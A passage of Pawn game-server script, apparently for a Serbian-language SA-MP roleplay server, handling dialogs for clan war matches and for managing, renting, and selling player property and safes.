			GiveWeaponToPlayer( WARInfo[ w ][ WARTimLider ][ 0 ], WARInfo[ w ][ WAROruzje ][ 0 ], 300 );
			GiveWeaponToPlayer( WARInfo[ w ][ WARTimLider ][ 0 ], WARInfo[ w ][ WAROruzje ][ 1 ], 300 );
			GiveWeaponToPlayer( WARInfo[ w ][ WARTimLider ][ 0 ], WARInfo[ w ][ WAROruzje ][ 2 ], 300 );
			GiveWeaponToPlayer( WARInfo[ w ][ WARTimLider ][ 0 ], WARInfo[ w ][ WAROruzje ][ 3 ], 300 );
			SetPlayerVirtualWorld( WARInfo[ w ][ WARTimLider ][ 0 ], w );
			SetPlayerHealth( WARInfo[ w ][ WARTimLider ][ 0 ], 100 );
			SetPlayerArmour( WARInfo[ w ][ WARTimLider ][ 0 ], 100 );

			GiveWeaponToPlayer( WARInfo[ w ][ WARTimLider ][ 1 ], WARInfo[ w ][ WAROruzje ][ 0 ], 300 );
			GiveWeaponToPlayer( WARInfo[ w ][ WARTimLider ][ 1 ], WARInfo[ w ][ WAROruzje ][ 1 ], 300 );
			GiveWeaponToPlayer( WARInfo[ w ][ WARTimLider ][ 1 ], WARInfo[ w ][ WAROruzje ][ 2 ], 300 );
			GiveWeaponToPlayer( WARInfo[ w ][ WARTimLider ][ 1 ], WARInfo[ w ][ WAROruzje ][ 3 ], 300 );
			SetPlayerVirtualWorld( WARInfo[ w ][ WARTimLider ][ 1 ], w );
			SetPlayerHealth( WARInfo[ w ][ WARTimLider ][ 1 ], 100 );
			SetPlayerArmour( WARInfo[ w ][ WARTimLider ][ 1 ], 100 );

            WARInfo[ w ][ WARTeamID ][ 0 ] = PlayerInfo[ WARInfo[ w ][ WARTimLider ][ 0 ] ][ xClan ];
			WARInfo[ w ][ WARTeamID ][ 1 ] = PlayerInfo[ WARInfo[ w ][ WARTimLider ][ 1 ] ][ xClan ];

			WARInfo[ w ][ WARTimClanovi ][ 0 ]++;
			WARInfo[ w ][ WARTimClanovi ][ 1 ]++;

			WARInfo[ w ][ WARTimer ] = SetTimerEx_("ZaustaviWAR", 10*60000, 10*60000, 1, "i", w);
			WARInfo[ w ][ TimerWARMin ] = 1;
			WARInfo[ w ][ TimerWARSec ] = 0;
			WARInfo[ w ][ TimerWAROstaloVreme ] = SetTimerEx_("TimerWAROstaloVremeB", 1000, 1000, -1, "i", w);

            ResetujWarIgraca( WARInfo[ w ][ WARTimLider ][ 0 ] );
    		WARPInfo[ WARInfo[ w ][ WARTimLider ][ 0 ] ][ WARTim ][ 0 ] = true;
    		WARPInfo[ WARInfo[ w ][ WARTimLider ][ 0 ] ][ WARIgrac ] = w;

            ResetujWarIgraca( WARInfo[ w ][ WARTimLider ][ 1 ] );
    		WARPInfo[ WARInfo[ w ][ WARTimLider ][ 1 ] ][ WARTim ][ 1 ] = true;
			WARPInfo[ WARInfo[ w ][ WARTimLider ][ 1 ] ][ WARIgrac ] = w;

  		    SCMF( WARInfo[ w ][ WARTimLider ][ 0 ], 0xFFAF00FF, "(WAR): Tim 1 - {FFFFFF}%s {FFAF00}| Tim 2 - {FFFFFF}%s", getOrgName( PlayerInfo[ WARInfo[ w ][ WARTimLider ][ 0 ] ][ xClan ] ), getOrgName( PlayerInfo[ WARInfo[ w ][ WARTimLider ][ 1 ] ][ xClan ] ) );
    		SendClientMessage( WARInfo[ w ][ WARTimLider ][ 0 ], 0xFFAF00FF, "(WAR): Da koristite chat kucajte [ /wp ]. Da napustite war kucajte [ /warnapusti ]." );

  		    SCMF( WARInfo[ w ][ WARTimLider ][ 1 ], 0xFFAF00FF, "(WAR): Tim 1 - {FFFFFF}%s {FFAF00}| Tim 2 - {FFFFFF}%s", getOrgName( PlayerInfo[ WARInfo[ w ][ WARTimLider ][ 0 ] ][ xClan ] ), getOrgName( PlayerInfo[ WARInfo[ w ][ WARTimLider ][ 1 ] ][ xClan ] ) );
    		SendClientMessage( WARInfo[ w ][ WARTimLider ][ 1 ], 0xFFAF00FF, "(WAR): Da koristite chat kucajte [ /wp ]. Da napustite war kucajte [ /warnapusti ]." );

    		WarTDControl( WARInfo[ w ][ WARTimLider ][ 0 ], true );
			WarTDControl( WARInfo[ w ][ WARTimLider ][ 1 ], true );
    		SetWarStatsTD( w );
 
			DodajWarnRed("~y~(ADMIN) %s ~w~je pokrenu%s war izmedju ~y~%s ~w~i ~y~%s.", ImeIgraca( WARInfo[ w ][ WARTimLider ][ 0 ] ), PlayerInfo[WARInfo[ w ][ WARTimLider ][ 0 ]][xPol] == 1 ? "o" : "la", getOrgName( PlayerInfo[ WARInfo[ w ][ WARTimLider ][ 0 ] ][ xClan ] ), getOrgName( PlayerInfo[ WARInfo[ w ][ WARTimLider ][ 1 ] ][ xClan ] ) );
		}
		else
		{
		    new w = KreiranjeWara[ playerid ];
		    SendClientMessage( WARInfo[ w ][ WARTimLider ][ 0 ], 0xFFAF00FF, "(WAR): Protivnicki lider je odbio poziv za war." );
			WARInfo[ w ][ WARKreiranje ] = false;
	        WARInfo[ w ][ WARAktivan ] = false;
	        KreiranjeWara[ WARInfo[ w ][ WARTimLider ][ 0 ] ] = -1;
	        KreiranjeWara[ playerid ] = -1;
		}
	}
	else if(dialogid == dialog_PROPERTYLIST )
	{
	    if( !response ) return 1;
	    if( response )
		{
	        switch( listitem )
			{
				case 0:
				{
				    if( PlayerInfo[ playerid ][ xProperty ][ 0 ] == -1 ) return SendErrorMessage( playerid, "Nemate imovinu u slotu 1." );
					if( strcmp( ImeIgraca( playerid ), II[ PlayerInfo[ playerid ][ xProperty ][ 0 ] ][ iOwner ], true) == 0 )
					{
						ChosenProperty[ playerid ] = PlayerInfo[ playerid ][ xProperty ][ 0 ];
						ShowPlayerDialog( playerid, dialog_PROPCHOSEN, DIALOG_STYLE_LIST, D_NASLOV,
																									"{4282C0}(1). {FFFFFF}Informacije\n\
																									{4282C0}(2). {FFFFFF}Zakljucaj/Otkljucaj\n\
																									{4282C0}(3). {FFFFFF}Unapredi\n\
																									{4282C0}(4). {FFFFFF}Sef\n\
																									{4282C0}(5). {F81414}Prodaj drzavi\n\
																									{4282C0}(6). {FFFFFF}Prodaj igracu\n\
																									{4282C0}(7). {FFFFFF}{FFFFFF}Rentanje\n\
																									{4282C0}(8). {FFFFFF}Uzimanje novca\n\
																									{4282C0}(9). {FFFFFF}Ostavljanje novca", "Potvrdi", "Odustani" );
					}
					else SendErrorMessage( playerid, "Ovo nije vase." );
				}
				case 1:
				{
				    if( PlayerInfo[ playerid ][ xProperty ][ 1 ] == -1 ) return SendErrorMessage( playerid, "Nemate imovinu u slotu 2." );
				    if( strcmp( ImeIgraca( playerid ), II[ PlayerInfo[ playerid ][ xProperty ][ 1 ] ][ iOwner ], true) == 0 )
					{
						ChosenProperty[ playerid ] = PlayerInfo[ playerid ][ xProperty ][ 1 ];
						ShowPlayerDialog( playerid, dialog_PROPCHOSEN, DIALOG_STYLE_LIST, D_NASLOV,
																									"{4282C0}(1). {FFFFFF}Informacije\n\
																									{4282C0}(2). {FFFFFF}Zakljucaj/Otkljucaj\n\
																									{4282C0}(3). {FFFFFF}Unapredi\n\
																									{4282C0}(4). {FFFFFF}Sef\n\
																									{4282C0}(5). {F81414}Prodaj drzavi\n\
																									{4282C0}(6). {FFFFFF}Prodaj igracu\n\
																									{4282C0}(7). {FFFFFF}{FFFFFF}Rentanje\n\
																									{4282C0}(8). {FFFFFF}Uzimanje novca\n\
																									{4282C0}(9). {FFFFFF}Ostavljanje novca", "Potvrdi", "Odustani" );
					}
					else SendErrorMessage( playerid, "Ovo nije vase." );
				}
				case 2:
				{
				    if( PlayerInfo[ playerid ][ xProperty ][ 2 ] == -1 ) return SendErrorMessage( playerid, "Nemate imovinu u slotu 3." );
				    if( strcmp( ImeIgraca( playerid ), II[ PlayerInfo[ playerid ][ xProperty ][ 2 ] ][ iOwner ], true) == 0 )
					{
						ChosenProperty[ playerid ] = PlayerInfo[ playerid ][ xProperty ][ 2 ];
						ShowPlayerDialog( playerid, dialog_PROPCHOSEN, DIALOG_STYLE_LIST, D_NASLOV,
																									"{4282C0}(1). {FFFFFF}Informacije\n\
																									{4282C0}(2). {FFFFFF}Zakljucaj/Otkljucaj\n\
																									{4282C0}(3). {FFFFFF}Unapredi\n\
																									{4282C0}(4). {FFFFFF}Sef\n\
																									{4282C0}(5). {F81414}Prodaj drzavi\n\
																									{4282C0}(6). {FFFFFF}Prodaj igracu\n\
																									{4282C0}(7). {FFFFFF}{FFFFFF}Rentanje\n\
																									{4282C0}(8). {FFFFFF}Uzimanje novca\n\
																									{4282C0}(9). {FFFFFF}Ostavljanje novca", "Potvrdi", "Odustani" );
					}
					else SendErrorMessage( playerid, "Ovo nije vase." );
				}
	        }
	    }
	}
	else if(dialogid == dialog_PROPCHOSEN )
	{
	    if( !response ) return 1;
	    if( response )
		{
	        switch( listitem )
			{
				case 0:
				{
				    new hid = ChosenProperty[ playerid ];
				    if( GetNearestProperty( playerid ) != hid && inProperty[ playerid ] != hid ) return SendErrorMessage( playerid, "Niste pored svoje imovine ili u njoj!" );

				    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
				    format( globalstring, sizeof( globalstring ), "{4282C0}- {FFFFFF}%s {4282C0}| ID: {FFFFFF}(%d)\n\n", GetPropertyAName( hid ), hid );
					strcat( DialogStrgEx, globalstring);

					format( globalstring, sizeof( globalstring ), "{4282C0}- Novac: {FFFFFF}$%s\n", fNumber(II[hid][iMoney]));
                    strcat( DialogStrgEx, globalstring );
					format( globalstring, sizeof( globalstring ), "{4282C0}- Broj rentova: {FFFFFF}%s\n", fNumber(II[hid][iRentovano]));
					strcat( DialogStrgEx, globalstring );
				    if( II[ hid ][ iLocked ] == 1 ) strcat( DialogStrgEx, "{4282C0}- Status vrata: {FFFFFF}Zakljucano\n");
					else strcat( DialogStrgEx, "{4282C0}- Status vrata: {FFFFFF}Otkljucano\n");
			        if( II[ hid ][ iLockLevel ] == 0) strcat( DialogStrgEx, "{4282C0}- Kvaliteta brave: {FFFFFF}Nekvalitetna\n");
					else
					{
						format( globalstring, sizeof( globalstring ), "{4282C0}- Kvaliteta brave: {FFFFFF}%d\n",  II[ hid ][ iLockLevel ] );
						strcat( DialogStrgEx, globalstring);
					}
			        if( II[ hid ][ iDoorLevel ] == 0 ) strcat( DialogStrgEx, "{4282C0}- Kvalitet vrata: {FFFFFF}Nekvalitetna\n");
					else
					{
					    format( globalstring, sizeof( globalstring ), "{4282C0}- Kvalitet vrata: {FFFFFF}%d level\n",  II[ hid ][ iDoorLevel ] );
						strcat( DialogStrgEx, globalstring);
					}
					if( II[ hid ][ iAlarm ] > 0)
					{
						format( globalstring, sizeof( globalstring ), "{4282C0}- Alarm level: {FFFFFF}%d",  II[ hid ][ iAlarm ] );
						strcat( DialogStrgEx, globalstring );
					}
					else strcat( DialogStrgEx, "{4282C0}- Alarm: {FFFFFF}Nema" );

	                ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, D_NASLOV, DialogStrgEx, "OK", "" );
	    			strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
				}
				case 1:
				{
				    new id = ChosenProperty[ playerid ];
				    if( GetNearestProperty( playerid ) != id && inProperty[ playerid ] != id ) return SendErrorMessage( playerid, "Niste pored svoje imovine ili u njoj!" );
			        if( strcmp( ImeIgraca( playerid ), II[ id ][ iOwner ], true) == 0 )
					{
				        if( II[ id ][ iLocked ] == 0 )
						{
				            II[ id ][ iLocked ] = 1;

							PlayerPlaySound( playerid, 1145, 0.0, 0.0, 0.0 );

							SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s zakljucava %s.", ImeIgraca( playerid ), GetPropertyName( id ) );
			                SendInfoMessage(playerid, "Zakljucali ste kucu.");
			            }
						else
						{
						    II[ id ][ iLocked ] = 0;
							PlayerPlaySound( playerid, 1145, 0.0, 0.0, 0.0 );

							SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s otkljucava %s.", ImeIgraca( playerid ), GetPropertyName( id ) );
			                SendInfoMessage(playerid, "Otkljucali ste kucu.");
						}
					}
					else SendErrorMessage( playerid, "Ovo nije vase." );
				}
				case 2:
				{
				    new id = ChosenProperty[ playerid ];
				    if( inProperty[ playerid ] != id ) return SendErrorMessage( playerid, "Niste u vasoj kuci/stanu/vikendici." );

				    ShowPlayerDialog( playerid, dialog_PROPUNAPREDI, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Izaberite broj:\n1. alarm(500$)\n2. brava(300$)\n3. vrata(100$).", "Potvrdi", "Odustani" );
				}
				case 3:
				{
				    new id = ChosenProperty[ playerid ];
				    if( inProperty[ playerid ] != id ) return SendErrorMessage( playerid, "Niste u vasoj kuci/stanu/vikendici." );
					if( strcmp( ImeIgraca( playerid ), II[ inProperty[ playerid ] ][ iOwner ], true) == 0 )
					{
				    	ShowPlayerDialog( playerid, dialog_SAFEALL, DIALOG_STYLE_LIST, D_NASLOV,
																									"{4282C0}(1). {FFFFFF}Informacije\n\
																									{4282C0}(2). {FFFFFF}Ostavi drogu\n\
																									{4282C0}(3). {FFFFFF}Uzmi drogu\n\
																									{4282C0}(4). {FFFFFF}Ostavi oruzje\n\
																									{4282C0}(5). {FFFFFF}Uzmi oruzje\n\
																									{4282C0}(6). {FFFFFF}Ostavi materijale\n\
																									{4282C0}(7). {FFFFFF}Uzmi materijale", "Potvrdi", "Odustani" );
					}
					else SendErrorMessage( playerid, "Ovo nije vase." );
				}
				case 4:
				{
				    new id = ChosenProperty[ playerid ];
				    if( GetNearestProperty( playerid ) != id ) return SendErrorMessage( playerid, "Niste pored svoje imovine!" );
				    if(GlobalImovinaIgracu[playerid] != false) return SendErrorMessage(playerid, "Ne mozes prodati imovinu dok je u procesu prodaja igracu!");
			        if( strcmp( ImeIgraca( playerid ), II[ GetNearestProperty( playerid ) ][ iOwner ], true) == 0 )
					{
						ShowPlayerDialog( playerid, dialog_PROPSELLDRZAVA, DIALOG_STYLE_MSGBOX, D_NASLOV, "{FFFFFF}* Da li ste sigurni da zelite prodati vasu imovinu drzavi?", "Da", "Ne" );
					}
					else SendErrorMessage( playerid, "Ovo nije vase.." );
				}
				case 5:
				{
				    new id = ChosenProperty[ playerid ];
				    if( GetNearestProperty( playerid ) != id ) return SendErrorMessage( playerid, "Niste pored svoje imovine!" );
				    ShowPlayerDialog( playerid, dialog_PROPSELLTP, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* U prazni prostor ispod unesite ID igraca i cenu imovina:", "Ponudi", "Odustani" );
				}
				case 6:
				{
				    new id = ChosenProperty[ playerid ];
				    if( GetNearestProperty( playerid ) != id ) return SendErrorMessage( playerid, "Niste pored svoje imovine!" );
			        if( strcmp( ImeIgraca( playerid ), II[ GetNearestProperty( playerid ) ][ iOwner ], true) == 0 )
					{
						ShowPlayerDialog( playerid, dialog_RENTABLE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite cenu renta.\nAko uneses 0 nema rentanja u vasoj kuci.\nMaksimalna cena je 1000$", "Potvrdi", "Odustani" );
					}
					else SendErrorMessage( playerid, "Ovo nije vase.." );
				}
				case 7:
				{
				    new id = ChosenProperty[ playerid ];
				    if( inProperty[ playerid ] != id ) return SendErrorMessage( playerid, "Niste u vasoj kuci/stanu/vikendici." );
				    ShowPlayerDialog( playerid, dialog_PROPTAKEMONEY, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite koliko zelite da uzmete novca iz imovine.", "Potvrdi", "Odustani" );
				}
				case 8:
				{
				    new id = ChosenProperty[ playerid ];
				    if( inProperty[ playerid ] != id ) return SendErrorMessage( playerid, "Niste u vasoj kuci/stanu/vikendici." );
				    ShowPlayerDialog( playerid, dialog_PROPPUTMONEY, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite koliko zelite da ostavite novca u imovine.", "Potvrdi", "Odustani" );
				}
	        }
	    }
	}
	else if(dialogid == dialog_PROPTAKEMONEY )
	{
	    if( !response ) return 1;
	    if( response )
		{
	        new novac, id = ChosenProperty[ playerid ];
	        if( inProperty[ playerid ] != id ) return SendErrorMessage( playerid, "Niste u vasoj kuci/stanu/vikendici." );
	        if( sscanf( inputtext, "i", novac ) ) return ShowPlayerDialog( playerid, dialog_PROPTAKEMONEY, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite koliko zelite da uzmete novca iz imovine.", "Potvrdi", "Odustani" );
			if( novac < 1 || novac > 100000000 ) return ShowPlayerDialog( playerid, dialog_PROPTAKEMONEY, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite koliko zelite da uzmete novca iz imovine.", "Potvrdi", "Odustani" );
			if( novac > II[ id ][ iMoney ] ) return ShowPlayerDialog( playerid, dialog_PROPTAKEMONEY, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite koliko zelite da uzmete novca iz imovine.", "Potvrdi", "Odustani" );

			II[ id ][ iMoney ] -= novac;
			SaveProperty( id );
			DajIgracuNovac( playerid, novac );
			SendInfoMessage( playerid, "Uzeli ste {FFFFFF}($%d) {4282C0}iz sefa.", novac );
		}
	}
	else if(dialogid == dialog_PROPPUTMONEY )
	{
	    if( !response ) return 1;
	    if( response )
		{
	        new novac, id = ChosenProperty[ playerid ];
	        if( inProperty[ playerid ] != id ) return SendErrorMessage( playerid, "Niste u vasoj kuci/stanu/vikendici." );
	        if( sscanf( inputtext, "i", novac ) ) return ShowPlayerDialog( playerid, dialog_PROPPUTMONEY, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite koliko zelite da ostavite novca u imovine.", "Potvrdi", "Odustani" );
			if( novac < 1 || novac > 100000000 ) return ShowPlayerDialog( playerid, dialog_PROPPUTMONEY, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite koliko zelite da ostavite novca u imovine.", "Potvrdi", "Odustani" );
			if( novac > PlayerInfo[ playerid ][ xNovac ] ) return ShowPlayerDialog( playerid, dialog_PROPPUTMONEY, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite koliko zelite da ostavite novca u imovine.", "Potvrdi", "Odustani" );

			II[ id ][ iMoney ] += novac;
			SaveProperty( id );
			DajIgracuNovac( playerid, -novac );
			SendInfoMessage( playerid, "Ostavili ste {FFFFFF}($%d) {4282C0}u sef.", novac );
		}
	}
	else if(dialogid == dialog_RENTABLE )
	{
	    if( !response ) return 1;
	    if( response )
		{
	        new cena, id = ChosenProperty[ playerid ];
	        if( sscanf( inputtext, "i", cena ) ) return ShowPlayerDialog( playerid, dialog_RENTABLE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite cenu renta.\nAko uneses 0 nema rentanja u vasoj kuci.\nMaksimalna cena je 1000$", "Potvrdi", "Odustani" );
	        if( cena < 0 || cena > 1000 ) return ShowPlayerDialog( playerid, dialog_RENTABLE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite cenu renta.\nAko uneses 0 nema rentanja u vasoj kuci.\nMaksimalna cena je 1000$", "Potvrdi", "Odustani" );

			if( cena == 0 )
			{
	            II[ id ][ iRentable ] = 0;
				II[ id ][ iRentPrice ] = 0;

				PropertyRefresh( id );
				SaveProperty( id );
				SendInfoMessage( playerid, "Ugasili ste mogucnost rentanja." );
	        }
	        else if( cena > 0 )
			{
	            II[ id ][ iRentable ] = 1;
				II[ id ][ iRentPrice ] = cena;

				PropertyRefresh( id );
				SaveProperty( id );
				SendInfoMessage( playerid, "Ukljucili ste mogucnost rentanja za {FFFFFF}($%d).", cena );
	        }
	    }
	}
	else if(dialogid == dialog_PROPSELLDRZAVA )
	{
	    if( response )
		{
	        if( PlayerInfo[ playerid ][ xBRacun ] < 0 ) return SendErrorMessage( playerid, "Ne mozes da prodas imovinu dok ne izadjes iz minusa u banci." );
	        new id = ChosenProperty[ playerid ];
			if( GetNearestProperty( playerid ) != id ) return SendErrorMessage( playerid, "Niste pored svoje imovine!" );
			if( strcmp( ImeIgraca( playerid ), II[ GetNearestProperty( playerid ) ][ iOwner ], true) == 0 )
			{
				WriteLog("log-sell", "Igrac %s je prodao imovinu ID %d na buy", ImeIgraca( playerid ), id);

		        strmid( II[ GetNearestProperty( playerid ) ][ iOwner ], "Drzava", 0, strlen( "Drzava" ), 32);

			    DajIgracuNovac( playerid, (II[ GetNearestProperty( playerid ) ][ iPrice ]/2) );
                II[ GetNearestProperty( playerid ) ][ iNeaktivnost ] = 0;
				II[ GetNearestProperty( playerid ) ][ iOwned ] = 0;
				II[ GetNearestProperty( playerid ) ][ iOnAuction ] = false;
  				II[ GetNearestProperty(playerid) ][ iOwnerSQLID ] = -1;
				PlayerPlaySound( playerid, 1058, 0, 0, 0 );
				PropertyRefresh( GetNearestProperty( playerid ) );
				SaveProperty( GetNearestProperty( playerid ) );

				if( PlayerInfo[ playerid ][ xProperty ][ 0 ] == id )
				{
			        PlayerInfo[ playerid ][ xProperty ][ 0 ] = -1;
			        PlayerInfo[ playerid ][ xPropertySqlID ][ 0 ] = 0;
					sql_user_update_integer( playerid, "property_id_1", PlayerInfo[ playerid ][ xPropertySqlID ][ 0 ] );
				}
			    else if( PlayerInfo[ playerid ][ xProperty ][ 1 ] == id )
				{
					PlayerInfo[ playerid ][ xProperty ][ 1 ] = -1;
					PlayerInfo[ playerid ][ xPropertySqlID ][ 1 ] = 0;
					sql_user_update_integer( playerid, "property_id_2", PlayerInfo[ playerid ][ xPropertySqlID ][ 1 ] );
				}
			    else if( PlayerInfo[ playerid ][ xProperty ][ 2 ] == id )
				{
					PlayerInfo[ playerid ][ xProperty ][ 2 ] = -1;
					PlayerInfo[ playerid ][ xPropertySqlID ][ 2 ] = 0;
					sql_user_update_integer( playerid, "property_id_3", PlayerInfo[ playerid ][ xPropertySqlID ][ 2 ] );
				}
			}
			else SendErrorMessage( playerid, "Ovo nije vase." );
	    }
	    if( !response )
		{
	        SendClientMessage( playerid, CRVENA, "(IMOVINA): Odustali ste od prodaje imovine drzavi." );
	    }
	}
	else if(dialogid == dialog_PROPSELLTP )
	{
	    if( !response ) return 1;
	    if( response )
		{
	        if( PlayerInfo[ playerid ][ xBRacun ] < 0 ) return SendErrorMessage( playerid, "Ne mozes da prodas imovinu dok ne izadjes iz minusa u banci." );
	        new id = ChosenProperty[ playerid ], idigraca, cena, string[ 128 ], Float:Pos[ 3 ];
	        if( sscanf( inputtext, "ui", idigraca, cena ) ) return ShowPlayerDialog( playerid, dialog_PROPSELLTP, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* U prazni prostor ispod unesite ID igraca i cenu imovina:", "Ponudi", "Odustani" );
            GetPlayerPos( idigraca, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
			if( !IsPlayerInRangeOfPoint( playerid, 3.0, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] ) ) return SendErrorMessage( playerid, "Igrac nije blizu vas");
			if( cena < 1 ) return SendErrorMessage( playerid, "Cena ne moze biti manja od 1$!");
            if( idigraca == IPI ) return SendErrorMessage( playerid, "Pogresan ID." );
			if( idigraca == playerid ) return SendErrorMessage( playerid, "Ne mozes sam sebi prodati kucu!");
			if( PlayerInfo[ idigraca ][ xProperty ][ 0 ] != -1 && PlayerInfo[ idigraca ][ xProperty ][ 1 ] != -1 && PlayerInfo[ idigraca ][ xProperty ][ 2 ] != -1 ) return SendErrorMessage( playerid, "Igrac vec ima 3 imovine!");
            if( PlayerInfo[ idigraca ][ xLevel ] < II[ id ][ iLevel ] ) return SCMF( playerid, CRVENA, "(IMOVINA): Da bi ste tom igracu prodali ovu imovinu, on mora biti level {FFFFFF}(%d+).", II[ id ][ iLevel ] );
            SCMF( playerid, 0x33CCFFFF, "(IMOVINA): Ponudili ste igracu {FFFFFF}%s {33CCFF}imovinu po ceni od {FFFFFF}($%d).", ImeIgraca( idigraca ), cena );
			GlobalProdaja[ idigraca ] = playerid;
			GlobalCena[ idigraca ] = cena;
			GlobalID[ idigraca ] = id;
			GlobalImovinaIgracu[playerid] = true;
			format( string, sizeof( string ), "{FFFFFF}* Igrac %s vam je ponudio da kupite njegovu imovinu za $%d.", ImeIgraca( playerid ), cena );
			ShowPlayerDialog( idigraca, dialog_ACCEPTPROP, DIALOG_STYLE_MSGBOX, D_NASLOV, string, "Prihvati", "Odbij" );
	    }
	}
	else if(dialogid == dialog_ACCEPTPROP)
	{
	    if( response )
		{
	        new id = GlobalID[ playerid ];
	        if( PlayerInfo[ playerid ][ xNovac ] < GlobalCena[ playerid ] ) return SendErrorMessage( playerid, "Nemate dovoljno novca.");

			if( PlayerInfo[ GlobalProdaja[ playerid ] ][ xProperty ][ 0 ] == id ) 
			{ 
				PlayerInfo[ GlobalProdaja[ playerid ] ][ xProperty ][ 0 ] = -1; 
				PlayerInfo[ GlobalProdaja[ playerid ] ][ xPropertySqlID ][ 0 ] = 0; 
			}
			else if( PlayerInfo[ GlobalProdaja[ playerid ] ][ xProperty ][ 1 ] == id ) 
			{ 
				PlayerInfo[ GlobalProdaja[ playerid ] ][ xProperty ][ 1 ] = -1; 
				PlayerInfo[ GlobalProdaja[ playerid ] ][ xPropertySqlID ][ 1 ] = 0; 
			}
			else if( PlayerInfo[ GlobalProdaja[ playerid ] ][ xProperty ][ 2 ] == id ) 
			{ 
				PlayerInfo[ GlobalProdaja[ playerid ] ][ xProperty ][ 2 ] = -1; 
				PlayerInfo[ GlobalProdaja[ playerid ] ][ xPropertySqlID ][ 2 ] = 0; 
			}

			if( PlayerInfo[ playerid ][ xProperty ][ 0 ] == -1 ) 
			{ 
				PlayerInfo[ playerid ][ xProperty ][ 0 ] = id; 
				PlayerInfo[ playerid ][ xPropertySqlID ][ 0 ] = II[id][iSQLID]; 
			}
		    else if( PlayerInfo[ playerid ][ xProperty ][ 1 ] == -1 ) 
		    { 
		    	PlayerInfo[ playerid ][ xProperty ][ 1 ] = id; 
				PlayerInfo[ playerid ][ xPropertySqlID ][ 1 ] = II[id][iSQLID]; 
		    }
		    else if( PlayerInfo[ playerid ][ xProperty ][ 2 ] == -1 ) 
		    { 
		    	PlayerInfo[ playerid ][ xProperty ][ 2 ] = id; 
				PlayerInfo[ playerid ][ xPropertySqlID ][ 2 ] = II[id][iSQLID]; 
		    }

			WriteLog("log-sell", "Igrac %s je prodao imovinu ID %d igracu %s za %d", ImeIgraca( GlobalProdaja[ playerid ] ), id, ImeIgraca( playerid ), GlobalCena[ playerid ]);
            SCMF( playerid, 0x33CCFFFF, "(IMOVINA): Uspesno ste kupili imovinu od igraca {FFFFFF}%s {33CCFF}za {FFFFFF}($%d).", ImeIgraca( GlobalProdaja[ playerid ] ), GlobalCena[ playerid ] );
			
			strmid( II[ id ][ iOwner ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 255);
  			II[ id ][ iOwnerSQLID ] = PlayerInfo[playerid][xID];
			SaveProperty( id );
			PropertyRefresh( id );

			sql_user_update_property( playerid );
			sql_user_update_property( GlobalProdaja[ playerid ] );

			SCMF( GlobalProdaja[ playerid ], ZUTA, "(IMOVINA): Prodali ste kucu igracu {FFFFFF}%s {33CCFF}za {FFFFFF}($%d).", ImeIgraca( playerid ), GlobalCena[ playerid ] );
			SendClientMessage( playerid, ZUTA, "(IMOVINA): Kupili ste kucu." );

			DajIgracuNovac( GlobalProdaja[ playerid ], GlobalCena[ playerid ] );
			DajIgracuNovac( playerid, -GlobalCena[ playerid ] );

			GlobalProdaja[ playerid ] = -1;
			GlobalCena[ playerid ] = -1;
			GlobalID[ playerid ] = -1;
			GlobalImovinaIgracu[GlobalProdaja[playerid]] = false;
	    }
	    else if( !response )
		{
			SCMF( GlobalProdaja[ playerid ], ZUTA, "(IMOVINA): Igrac {FFFFFF}%s {FFFF00}je odbio vasu ponudu za kupovinu imovine.", ImeIgraca( playerid ) );
			SendClientMessage( playerid, ZUTA, "(IMOVINA): Odbili ste ponudu.");

			GlobalProdaja[ playerid ] = -1;
			GlobalCena[ playerid ] = -1;
			GlobalID[ playerid ] = -1;
	    }
	}
	else if(dialogid == dialog_SAFEALL )
	{
	    if( !response ) return 1;
	    if( response )
		{
	        switch( listitem )
			{
				case 0:
				{
				    new hid = inProperty[ playerid ];
				    new wepname1[32], wepname2[32], wepname3[32], wepname4[32];

					if( II[ hid ][ iOruzje ][ 0 ] != 0) format( wepname1, sizeof( wepname1 ), "%s", WeapNames[ II[ hid ][ iOruzje ][ 0 ] ] );
					else strmid(wepname1, "None", 0, 5);

					if( II[ hid ][ iOruzje ][ 1 ] != 0) format( wepname2, sizeof( wepname2 ), "%s", WeapNames[ II[ hid ][ iOruzje ][ 1 ] ] );
					else strmid(wepname2, "None", 0, 5);

	                if( II[ hid ][ iOruzje ][ 2 ] != 0) format( wepname3, sizeof( wepname3 ), "%s", WeapNames[ II[ hid ][ iOruzje ][ 2 ] ] );
					else strmid(wepname3, "None", 0, 5);

					if( II[ hid ][ iOruzje ][ 3 ] != 0) format( wepname4, sizeof( wepname4 ), "%s", WeapNames[ II[ hid ][ iOruzje ][ 3 ] ] );
					else strmid(wepname4, "None", 0, 5);

					strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

					format( globalstring, sizeof( globalstring ), "{FFFFFF}Novac: $%s\n\n", fNumber(II[hid][iMoney]));
					strcat( DialogStrgEx, globalstring );

					format( globalstring, sizeof( globalstring ), "Materijali: %s\n", fNumber(II[hid][iMats]));
					strcat( DialogStrgEx, globalstring );

					format( globalstring, sizeof( globalstring ), "Droga: (%sg)\n", fNumber(II[hid][iDrugAmmount]));
					strcat( DialogStrgEx, globalstring );

